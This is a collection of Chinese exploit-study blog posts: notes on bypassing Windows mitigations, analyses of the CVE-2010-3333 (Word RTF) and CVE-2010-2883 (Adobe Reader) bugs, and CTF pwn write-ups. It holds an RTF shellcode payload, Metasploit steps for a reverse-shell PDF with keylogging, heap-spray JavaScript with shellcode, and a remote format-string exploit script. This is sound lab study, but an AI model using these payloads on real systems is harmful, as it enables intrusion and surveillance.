[{"title":"各类型软件漏洞合集","url":"/posts/61516/","content":"# 0x01 格式化串漏洞\n## 介绍\n格式化串漏洞产生于数据输出函数中对输出格式解析的缺陷。当输入输出函数的格式控制符能够被外界影响时，攻击者可以利用读写内存的方法修改函数返回地址，劫持进程，使shellcoed得到执行。\n\n此类漏洞发生条件苛刻，实际案例很少。\n## 能够引起此漏洞的函数\n```\nint printf(const char* format [,argument]...);\nint wprintf(const wchar_t* format [,argument]...);\nint fwprintf(FILE* stream,const wchar_t* format [,argument]...);\nint sprintf(char buffer,const char* format [,argument]...);\nint swprintf(wchar_t *buffer,const wchar_t *format [,argument]...);\nint vprintf(const char* format,va_list argptr );\nint vwprintf(const wchar_t* format,va_list argptr );\nint vfprintf(FILE *stream,const char* format,va_list argptr );\nint vfwprintf(FILE *stream,const wchar_t* format,va_list argptr );\nint vsprintf(char *buffer,const char* format,va_list argptr );\nint vswprintf(wchar_t *buffer,const wchar_t* format,va_list argptr );\n```\n\n# 0x02 GS安全编译选项保护\n## 介绍\n在所有函数调用发生时，GS编译选项会向栈帧内压入一个额外的随机DWORD,这个随机数被称为canary，在EBP前，系统在.data内存区存放了canary副本，函数返回前系统会执行安全验证操作，比较栈帧中canary与内存区副本是否一致，不一致则证明发生溢出，系统将进行异常处理。\n## 以下情况不会应用GS\n* 函数不包含缓冲区\n* 函数被定义为具有变量参数列表\n* 函数使用无保护的关键字标记\n* 函数在第一个语句中包含内嵌汇编代码\n* 缓冲区不是8字节类型且大小不大于4个字节。\n\n## 典型突破GS的方法\n### 利用未保护的内存\n为了将GS对性能的影响降到最小，并不会所有的函数都会被保护，我们可以利用一些未被保护的函数绕过GS保护。\n> 例子：函数中不包含4字节以上的缓冲区，不受到GS保护，函数返回前未进行任何安全检测，可以覆盖返回地址。\n\n\n``` mov eax,1\n\tmov esp,ebp\n\tpop ebp\n\tretn```\n\n### 覆盖虚函数\n程序只有在函数返回时才会check，而在此之前没有任何检查措施，我们可以在程序检查cookie之前劫持程序流程，实现溢出。\n> 例子：利用C++的虚函数来绕过GS机制。\n>> 当函数中存在溢出，可能会影响到虚表指针，继而可以控制虚表指针使其指向我们可以控制的内存空间。\n> 虚函数实现过程：程序根据虚表指针找到虚表，然后从虚表中取出要调用的虚函数地址，根据地址转入虚函数执行。\n\n### 攻击异常处理\nGS对S.E.H没有提供保护。我们可以通过攻击异常处理绕过GS.\n\n通过超长字符串覆盖掉异常处理函数指针，想办法触发一个异常，程序就会转入异常处理，由于异常处理函数指针已经被覆盖，我们就可以通过劫持S.E.H来控制程序的后续流程。\n### 同时替换栈中和.data中的Cookie\ncookie的生成具有很强的随机性，因为才出来基本不可能。同时替换栈中和.data中的cookie保证溢出后的一致性。\n> 例子：将shellcode赋值为8个0x90,OD运行断在test函数的if语句处，从if_addr取出cookie，与ebp异或后放入ebp-4的位置去。（函数返回前的校验过程：程序从ebp-4的位置取出cookie,与ebp异或后与if_addr处cookie比较一致性），如此.data中cookie成功修改为0x90.\n> 接下来控制栈中cookie，通过超长字符串覆盖变量，修改cookie。\n> 布置shellcode:首先放4个0x90用于修改if_addr，然后跟着弹出“failwest”的机器码，然后用0x90填充至cookie的位置，接下来跟着90909090与当前ebp异或的结果，最后再加上4个字节的填充和shellcode起始地址(用来覆盖函数返回地址)\n\n# 0x03 SafeSEH：对异常处理的保护机制\n在程序调用异常处理函数前，对要调用的异常处理函数进行校验，当发现函数不可靠将终止异常处理函数的调用。\n## 校验流程\n异常处理函数的调用是通过RtlDispatchException()函数处理实现，SafeSEH机制也是从此处开始。其校验流程如下：\n\n* 检查异常处理链是否位于当前程序的栈中\n* 异常处理指针是否指向当前程序栈中\n* 调用函数RtlIsVaildHandler()对异常处理函数进行校验\n\t* 异常处理函数地址是否在加载模块的内存空间\n\t* 判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识（标识被设置，函数返回校验失败）\n\t* 程序中是否包含安全S.E.H表，将异常处理函数地址与该表匹配，成功则继续\n\t* 判断是否设置ILonly标识。（设置此标识，证明该程序只包含.NET编译人中间语言，校验失败）\n\t* 判断异常处理函数地址是否位于不可执行页上，位于，则检测DEP是否开启，未开启则校验成功\n\t* 判断系统是否允许跳转到加载模块的内存空间外执行，允许则返回成功\n\n> RtlIsVaildHandler()允许异常处理函数执行的情况：\n>> 异常处理函数位于加载模块内存范围之外，DEP关闭\n>> 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，且模块不是纯IL（中间语言）.\n>> 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，异常处理函数地址包含在安全SEH表中。\n\n## 绕过SafeSEH（不考虑DEP影响）\n* 攻击返回地址绕过。\n\t* 一个程序启用了SafeSEH但是未启用GS(或被攻击函数不受到GS保护)，攻击函数返回地址\n* 利用虚函数绕过\n* 从堆中绕过\n* 利用未启用SafeSEH模块绕过\n* 利用加载模块之外的地址绕过SafeSEH\n* \n\n# 0x04 DEP\n## 介绍\n溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，DEP(数据执行保护)就是用来弥补计算机对数据和代码混淆这一天然缺陷。\n\nDEP基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。\n\nDEP主要作用是阻止数据页执行代码，分为软件DEP和硬件DEP.\n\n软件DEP即SafeSEH，与CPU硬件无关。\n\n硬件DEP是由Windows利用软件模拟实现，对操作系统提供一定的保护。（硬件DEP才是真正的DEP,需要CPU支持，AMD称之为NX，Intel称之为XD）\n\n## 攻击DEP方法\n### 攻击未启用DEP程序\n### 利用Ret2Libc挑战DEP\nret2libc是return-to-libc的缩写，由于DEP不允许我们直接到非可执行也执行指令，我们需要在其他可执行的位置找到符合我们要求的指令，让这条指令替我们工作，为了控制此条指令，在指令执行后还需要一个返回指令，以便回收程序的控制权。\n\n#### 三种相对有效的绕过DEP的exploit方法\n* 通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行\n* 通过跳转到VirtualProtect函数来将shellcode所在内存页设置为可执行状态，然后在转入shellcode执行\n* 通过跳转到VIrtualAlloc函数开辟一段具有执行权限的内存空间建，然后将shellcode复制到这段内存中执行\n\n### 利用可执行内存挑战DEP\n有时候在进程的内存空间中会存在一段可读可写可执行的内存，如果能够将shellcode复制到这段内存中，并劫持程序流程，我们的shellcode就有执行的机会。此处需要一些运气，然而我在做实验上一向运气很差……,如果被攻击的程序内存空间中存在这样一个可执行的数据区域，就可以直接通过memcpy函数将shellcode复制到这段内存区域中执行。\n### 利用.NET挑战DEP\n.NET的文件具有和PE文件一样的结构，即也具有.text等段，这些段会被映射到内存中，也会具有一定的可执行属性。将shellcode放到.NET中具有可执行属性的段中，然后让程序转入这个区域执行，就可以执行shellcode了。\n### 利用java applet挑战DEP\njava applet与.NET类似，都可以被IE浏览器加载到客户端，而且加载到IE进程的内存空间后这些控件所在内存空间都具有可执行属性。\n\n# 0x05 ASLR\n## 介绍\nASLR,通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。包含了映像随机化、堆栈随机化、PEB与TEB随机化。\n\n（支持ASLR的程序在它的PE头中会设置IMAGE_DLL_CHARACTERISITCS_DYNAMIC_BASE标识来说明，编译程序时启用/dynmicbase链接选项就可以支持ASLR了）\n\n### 映像随机化\n在PE文件映射到内存中，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启红藕这个地址会变化。\n\n映像随机化只对加载基址的前2个字节做了随机处理。\n### 堆栈随机化\n在程序运行时随机的选择堆栈基址，堆栈基址在打开程序的时候确定。\n### PEB和TEB随机化\nTEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30的位置。\n## 攻击方式\n### 攻击未启用ASLR模块\nASLR仅仅是安全机制，不支持ASLR的软件很多，这意味着加载基址固定，在当前进程找到这样的模块就可以利用它里面的指令作为跳板直接无视ASLR.\n\n如：Adobe Flash Player ActiveX\n### 利用部分覆盖进行定位内存地址\n之前说过，映像随机化只是对映像加载基址的前2个字节做随机化处理，我们可覆盖这个地址的最后几个固定字节，就可以在一定范围内控制程序。\n采用这种类似相对寻址方法来动态确定跳板指令的地址以实现调班指令的通用性。\n### 利用Heap spray技术定位内存地址\nHeap spray原理：通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。\n### 利用Java applet heap spray技术定位内存地址\n### 为.NET控件禁用ASLR\n","categories":[],"tags":["漏洞"]},{"title":"漏洞战争学习笔记 2：CVE-2010-3333","url":"/posts/11816/","content":"## 0x01 分析环境\nos:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。\n\n操作系统：windows XP SP3\n虚拟机：VM\n调试器：WinDbg、OD、IDA\noffice:office word 2003 11.8169.8172\n\n## 0x02 漏洞描述\noddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的\"pFragments\"属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名\"RTF栈缓冲区溢出漏洞\"。\n\noffice word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。\n## 0x03 分析过程\n用Metasploit生成测试样本msf.rtf。\n\n\n![生成msf.PNG](https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png)\n\n\n运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！\n\n\n![裂开.PNG](https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png)\n\n[待续]\n\n打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。\n\n* g\n* kb\n\n在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，\n结合IDA，可知调用函数及其执行流程：30f4cc5d->30f4cc93 call 30e9eb62->30e9eb88\n\n通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD\n\n* p\n\n为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用\n## 0x04 漏洞利用\n### 覆盖返回地址\n\n找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃\n### 布置shellcode\n分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，\n布置shellcode如下：\n\n```\n{\\rtf1{}{\\shp{\\*\\shpinst{\\sp{\\sn pfragments}{\\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}\n```","categories":[],"tags":["漏洞战争"]},{"title":"漏洞战争学习笔记 1：CVE-2010-2883","url":"/posts/53423/","content":"## 漏洞背景介绍\nCVE-2010-2883是Adobe Reader 和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的pdf文件就有可能导致执行任意代码。\n\n## 分析环境\n操作系统：Windows XP SP3\n调试器：OllyDbg\n反汇编：IDA pro 7.2\n目标：Adobe Reader 9.3.0\n## 0x01 漏洞利用\n* 攻击机：kali\n* 靶机：windows xp sp3\n\nkali机上，打开msfconsole,使用metasploit生成pdf木马文件\n\n* msfconsole -q //进入msf框架\n* search cve-2010-2883 //找到漏洞模块\n* use exploit/windows/fileformat/adobe_cooltype_sing //使用模块\n* set payload windows/meterpreter/reverse_tcp //调用meterpreter载荷，反向连接到渗透机\n* set lhost 192.168.119.128 //设置主机ip\n* set FileNAME 2883.pdf //设置生产带有后门pdf文件名\n* set lport 99999 //设置本地监听端口\n* exploit //执行渗透生成文件成功\n\n将文件拷贝到windows xp（靶机）。\n\nmetasploit开启shell监听会话\n\n\n![获取到shell.PNG](https://i.loli.net/2020/07/20/WvKMtdn3P8bx5cB.png)\n\n\n* back\n* use exploit/multi/handler //使用hhandler监听模块\n* set payload windows/meterpreter/reverse_tcp\n* set lhost 192.168.119.128 //设置及监听IP地址（kali）\n* set lport 9999 //设置监听的端口（与pdg文件一致）\n* exploit //开启监听\n\n靶机打开2883.pdf文件，kali端即可获取shell会话。\n\n* sysinfo //查看系统信息\n* getuid //查看当前用户\n* screenshot //截屏查看靶机桌面\n* ps //查看进程\n* migrate 148 //切换进程到148 \n* shell //获取到Dos shell\n* keyscan_start //开启键盘记录\n* keyscan_dump //输出键盘记录\n\n\n## 0x02 基于字符串定位的漏洞分析方法\n### IDA静态分析\n打开cooltype.dll，alt+t搜索“SING”，依次进入检查是否有敏感信息，大概是第二个SING,发现调用函数sttrcat，在拼接字符串时未进行长度检查，可能会造成栈溢出，strcat为溢出点。\n```\n.text:0803DBF2                 push    ebp\n.text:0803DBF3                 sub     esp, 104h       ; 分配栈空间0x104h\n.text:0803DBF9                 lea     ebp, [esp-4]    ; 后面的strcat会将执行结果保存在ebp中，strcat的目的地\n.text:0803DBFD                 mov     eax, ___security_cookie ；安全cookie\n.text:0803DC02                 xor     eax, ebp ;cookie^ebp(sep-4);\n.text:0803DC04                 mov     [ebp+108h+var_4], eax ;将cookie保存到栈，以作安全检查\n.text:0803DC0A                 push    4Ch\n.text:0803DC0C                 mov     eax, offset loc_81847C4\n.text:0803DC11                 call    __EH_prolog3_catch\n.text:0803DC16                 mov     eax, [ebp+108h+arg_C]\n.text:0803DC1C                 mov     edi, [ebp+108h+arg_0]\n.text:0803DC22                 mov     ebx, [ebp+108h+arg_4]\n.text:0803DC28                 mov     [ebp+108h+var_130], edi\n.text:0803DC2B                 mov     [ebp+108h+var_138], eax\n.text:0803DC2E                 call    sub_8041626\n.text:0803DC33                 xor     esi, esi\n.text:0803DC35                 cmp     dword ptr [edi+8], 3\n.text:0803DC39 ;   try {\n.text:0803DC39                 mov     [ebp+108h+var_10C], esi\n.text:0803DC3C                 jz      loc_803DDF9\n.text:0803DC42                 mov     [ebp+108h+var_124], esi\n.text:0803DC45                 mov     [ebp+108h+var_120], esi\n.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1\n.text:0803DC48 ;   } // starts at 803DC39\n.text:0803DC4C ;   try {\n.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1\n.text:0803DC50                 jnz     loc_803DDA2\n.text:0803DC56                 push    offset aName    ; \"name\"\n.text:0803DC5B                 push    edi             ; int\n.text:0803DC5C                 lea     ecx, [ebp+108h+var_124]\n.text:0803DC5F                 mov     [ebp+108h+var_119], 0\n.text:0803DC63                 call    sub_802178F\n.text:0803DC68                 cmp     [ebp+108h+var_124], esi\n.text:0803DC6B                 jnz     short loc_803DCD6\n.text:0803DC6D                 push    offset aSing    ; \"SING\"\n.text:0803DC72                 push    edi             ; int\n.text:0803DC73                 lea     ecx, [ebp+108h+var_12C] ; ecx传参，thiscall调用约定，推测指向sing表入口\n.text:0803DC76                 call    sub_8021ABE     ; 处理sing表\n.text:0803DC7B                 mov     eax, [ebp+108h+var_12C] ；SING表地址给eax\n.text:0803DC7E                 cmp     eax, esi        ; 判断是否为空\n.text:0803DC7E ;   } // starts at 803DC4C\n.text:0803DC80 ;   try {\n.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2\n.text:0803DC84                 jz      short loc_803DCBD ; 不跳转\n.text:0803DC86                 mov     ecx, [eax]      ; 字体资源版本号，这里为1.0版本，即00 10 00 00\n.text:0803DC88                 and     ecx, 0FFFFh\n.text:0803DC8E                 jz      short loc_803DC98 ; 跳转\n.text:0803DC90                 cmp     ecx, 100h\n.text:0803DC96                 jnz     short loc_803DCB9\n.text:0803DC98\n.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9C↑j\n.text:0803DC98                 add     eax, 10h        ; 相对sing表入口偏移0x10处找到uniqueName\n.text:0803DC9B                 push    eax             ; Source 源地址，长度不固定\n.text:0803DC9C                 lea     eax, [ebp+108h+Dest] ；eax=ebp+108-108=ebp;ebp=esp-4,即复制到栈顶部位置\n.text:0803DC9F                 push    eax             ; Dest 目的地址：固定大小的栈空间\n.text:0803DCA0                 mov     [ebp+108h+Dest], 0 ；清0\n.text:0803DCA4                 call    strcat          ; 未检查大小，造成溢出\n```\n> GS:由IDA汇编分析，函数开始出有安全cookie，判定存在GS机制。\n> DEP:数据执行保护，即没有执行权限的内存空间不允许执行代码。\n> ASLR:地址空间布局随机化，包含映像随机化与堆栈随机化，010Editor打开目标exe，找到相关字段，发现已开启。\n\n![图片.png](https://i.loli.net/2020/07/24/aLpHZ9y4qbc7dAu.png)\n\n### SING表结构分析\n在kali生成的msf.pdf文件，使用PdfStreamDumper打开，在第十个Stream中找到Sing字段，将整合各Stream另存为TTF文件。\n\n![工具找到sing字段.PNG](https://i.loli.net/2020/07/24/fEzYQ4GMuwoDvP3.png)\n\n![捕获.PNG](https://i.loli.net/2020/07/24/41Jd3hzA8G6fyYw.png)\n官方文档中对TableEntry结构的定义：\n\n```\ntypedef sturct_SING\n{\nchar tag[4]; //标记：“SING”\nULNG checkSum; //校验和：“0xD9BCC8B5”\nULNG offset; //相对文件的偏移：“0x0000011C”\nULONG length; //数据长度：“0x00001DDF”\n}TableEntry;\n```\n\n![TTF的tableentry结构.PNG](https://i.loli.net/2020/07/24/J8laM9DIOiYHeg7.png)\n\n### JS堆喷射代码\n在第一个object处找到OpenAction,表示在第11个obj中，pdf运行时会执行里面脚本。\n\n![捕获.PNG](https://i.loli.net/2020/07/24/a3IvshLZowWm1xn.png)\n\n进入第11个obj，表示执行的js代码位于第12个obj中。\n\n![捕获.PNG](https://i.loli.net/2020/07/24/yxZ5nCGAFtvorkJ.png)\n\n进入第12个obj，发现实现堆喷射的js脚本。代码是经过混淆的，简单整理后获得js代码。（此处使用大佬整理好的了）\n```\nvar shellcode = unescape( '%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud7da%u82ba%ube98%ud9de%u2474%u5ef4%uc931%u31b1%uee83%u31fc%u1456%u5603%u7a96%u224b%uf87e%udbb4%u9d7e%u3e3d%u9d4f%u4a5a%u2dff%u1e28%uc6f3%u8b7c%uab80%ubca8%u0121%uf38f%u3ab2%u92f3%u4130%u7520%u8a09%u7435%uf74e%u24b4%u7307%ud96a%uc92c%u52b7%udf7e%u87bf%ude36%u19ee%ub94d%u9b30%ub182%u8378%ufcc7%u3833%u8a33%ue8c5%u730a%ud569%u86a3%u1173%u7903%u6b06%u0470%ua811%ud20b%u2b94%u91ab%u900f%u754a%u53c9%u3240%u3c9d%uc544%u3772%u4e70%u9875%u14f1%u3c52%uce5a%u65fb%ua106%u7504%u1ee9%ufda1%u4a07%u5fd8%u8d4d%uda6e%u8d23%ue570%ue613%u6e41%u71fc%ua55e%u8eb9%ue414%u06eb%u7cf1%u4aae%uab02%u72ec%u5e81%u808c%u2a99%ucd89%uc61d%u5ee3%ue8c8%u5e50%u8ad9%ucc37%u6281%u74d2%u7b23' );\nvar nop = unescape( \"%\" + \"u\" + \"0\" + \"c\" + \"0\" + \"c\" + \"%u\" + \"0\" + \"c\" + \"0\" + \"c\" );\nwhile (nop.length + 20 + 8 < 65536)\n nop+=nop;\nd = nop.substring(0, (0x0c0c-0x24)/2);\nd += shellcode;\nd += nop;\ne = d.substring(0, 65536/2);\nwhile(e.length < 0x80000)\n e += e;\nh = e.substring(0, 0x80000 - (0x1020-0x08) / 2);\nvar slide = new Array();\nfor (i=0;i<0x1f0;i++)\n slide[i]=h+\"s\";\n```\n\n从TableEntry结构入口偏移0x11C即使SING表的真实数据，即从“00 00 01 00”开始的部分，接着再偏移0x10即可找到uniqueName域。\n\n![uniquename.PNG](https://i.loli.net/2020/07/24/Ttae68OBCbc9GnL.png)\n\n执行strcat后会将“58 E0 8D AD”起始部分复制到ebp的指定地址，直到遇见NULL字符.\n\n### OD动态调试\n* 打开AR,OD中附加进程Cooltype.dll,溢出点strcat处下断点。\n\n![捕获.PNG](https://i.loli.net/2020/07/24/3AdJB9OGqLC2aHz.png)\n\n* 溢出前，源地址数据如下，是SING表中的uniqueName字段的内容：\n\n![捕获.PNG](https://i.loli.net/2020/07/24/xjGeuh3y5vw1TKn.png)\n\n正常情况下uniqueName字段为28字节，远小于栈空间大小0x104，就不会发生溢出。但是如果经过特殊构造，基于strcat复制内存时的特性（遇见NULL才停止）则会出现溢出。\n\n* 单步执行strcat函数后，目标地址位于栈中，站遭破坏，发生栈溢出。\n\n![捕获.PNG](https://i.loli.net/2020/07/24/1PhXAiMLfqOld2j.png)\n\n* 将上面复制进去的数据下内存访问断点，执行，直到遇到call。但是这一步我始终跳不过去，程序往往会直接终止。后面我直接把call改成了retn，成功跳过，但是在内存访问断点之后遇到一个call又会终止程序，很糟心。\n\n## 0x03 exploit分析\n\n漏洞成因：Cooltype.dll中使用strcat函数时未对uniqueName字段的字符串长度进行检查，直接复制到固定大小的栈空间，最终导致栈溢出，攻击者篡改了TTF文件，在pdf文件中嵌入了JS脚本。\n\n## 0x04 知识总结\n### 绕过GS\n* 通过安全cookie的检查，可以很好的探测栈是否被破坏/溢出；但是其也有很大弊端：只有在函数返回前，才会去检查security cookie，在之前是没有任何保护措施的.\n* 只要在安全cookie被检查之前劫持程序流程，就可无视GS保护，如OD中所示，产生溢出后，下内存访问断点，会有call 栈内数据的操作，由此直接劫持程序流程，从而绕过GS\n\n\n### 绕过DEP\n* 通过构造ROP链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行\n* 通过构造ROP链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行\n* 进一步调用memcpy将shellcode复制到此空间，从而实现shellcode的执行，绕过DEP\n\n### 绕过ASLR\n* 开启ASLR后，其对堆基址做了随机化处理，但对于Heap Spray来说是无效的\n* 不管怎样对堆基址进行随机化，其基址总会出现在较低的内存空间，远远小于堆喷射所需的0x0c0c0c0c地址，因此，Heap spray 完全可以绕过 ASLR \n\n### 调试思路总结\n* 构造恶意数据，实现栈溢出\n* 函数返回前（安全cookie检查前），调用恶意数据中的地址，开始实施ROP\n* 通过ROP，劫持执行流程指向0x0C0C0C0C\n* js堆喷射覆盖地址0x0C0C0C0C，从而执行另一块ROP\n* ROP块中为进程申请可执行权限的内存空间，并将shellcode复制其中\n* shellcode执行，成功利用！\n\n> 太难啦OD动态调试调不出来！到底是因为啥子啊啊啊啊啊","categories":[],"tags":["漏洞战争"]},{"title":"攻防世界 string","url":"/posts/54486/","content":"\nchecksec 查看保护机制\n\n\n\n![捕获.PNG](https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png)\n\n\n\n注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000.\n\n### 思路分析\n\nIDA64查看，在sub_400CA6()中发现：v1被强制转换成函数指针类型。\n\n\n![17627983-1901e053361f6609.png](https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png)\n\n\n\n> 注：``` ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);``` 就是将v1强制转换为一个函数指针\n\n其满足条件为 a1==a1[1]，回溯发现，a1为函数sub_400D72()函数的参数，即，a1为v5.\n\n\n![17627983-161d0aad17e6e884.png](https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png)\n\n\n\n可看出，v4=v5,且*v4=68;v4[1]=85;也就是说，a1=68,a1[1]=85.所以我们要修改a1值令a1=85\n\n按流程分析：\n在sub_400A7D()中，满足s1==“east”，则跳出函数。\n\n在sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写）\n\n\n![17627983-6cdde7e8a076f299.png](https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png)\n\n\n`printf(&format, &format);`\n\n\n通过此处可修改v4[0]值，现在需要确定v4[0]地址。在main()函数中，打印的secret[0]正是v5,即v4[0]地址。\n\n### 攻击思路\n\n通过格式化字符串漏洞赋值a1为85，使if条件成真，执行我们传入的shellcode拿到shell。\n\n> 函数调用约定：linux_x64下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9,当参数为7个以上时，前面6个与前面一样，但后面的以此从“右向左”放入栈中。\n\n> 利用pwntools自带的shellcodecraft工具，生成amd64架构下的shellcode，拿到shell.\n\n> Pwntools  shellcraft模块：是shellcode的模块，包含一些生成shellcode的函数，子模块声明架构（如：shellcode.arm是ARm架构；shellcraft.amd64是AMD64架构；shellcraft.common是所有架构通用）\n\n\n`printf(shellcraft.sh())  #打印出shellcode`\n`printf(asm(shellcraft.sh()))  #打印出汇编后的shellcode`\n\n\n用gdb调试程序，在printf下断点，输入%x测试，发现输出如图：\n\n\n![17627983-fe71239050c56166.png](https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png)\n\n\n填写address时我输入的是56（0x38），也就是[rsp+16]的位置，即格式化字符串的第7个参数（printf的第8个参数）\n\n> conext.log_level=\"debug\"  脚本在执行时输出debug的信息，可以通过观察这些信息查找哪步出错\n\n补：\n之前不知道sh.recv(7),16是什么意思，现在补充，就是sendline自带换行符，所以要把\\n过滤掉，7是因为v3就是打印的6个书，换行符是第7位，16代表十六进制。\n\n\n![17627983-56395b2513720994.png](https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png)\n\n\n\nexp：\n\n```\nfrom pwn import*\n #sh=process('./string')\nsh=remote('111.198.29.45',36129)\ncontext.log_level='debug'\nsh.recvuntil('secret[0] is')\nv3_addr=int(sh.recv(7),16)\nsh.recvuntil('name be:')\nsh.sendline('zzz')\nsh.recvuntil('east or up?:')\nsh.sendline('east')\nsh.recvuntil('leave(0)?:')\nsh.sendline('1')\nsh.recvuntil('\\'Give me an address\\'')\nsh.sendline(str(v3_addr))\nsh.recvuntil('you wish is:')\npayload='%085c'+'%7$n'\nsh.sendline(payload)\nsh.recvuntil('I will help you! USE YOU SPELL')\nsh.sendline(asm(shellcraft.amd64.linux.sh(),arch=\"amd64\"))\nsh.interactive()\n```\n\n\ncyberpeace{962a040a22938025e2ad4bbe3e5b56d3}\n","categories":[],"tags":["pwn"]},{"title":"攻防世界 int_overflow","url":"/posts/54610/","content":"\n### checksec 查看保护机制\n\n\n![捕获.PNG](https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png)\n\n\n\n可直接使用栈溢出；基地址不变化；栈中数据有执行权限；\n\n### 分析思路\n\n32位文件，按流程查看程序，main()无突破点。\n\n进入login(),限制username长度最大0x19;限制passwd长度最大0x199；\n\n进入check_passwd()，v3存储passwd长度，满足if语句3<v3<=8可跳到else语句。\n\n>此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。\n\n综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit）\n\n溢出之后到达else语句，函数返回  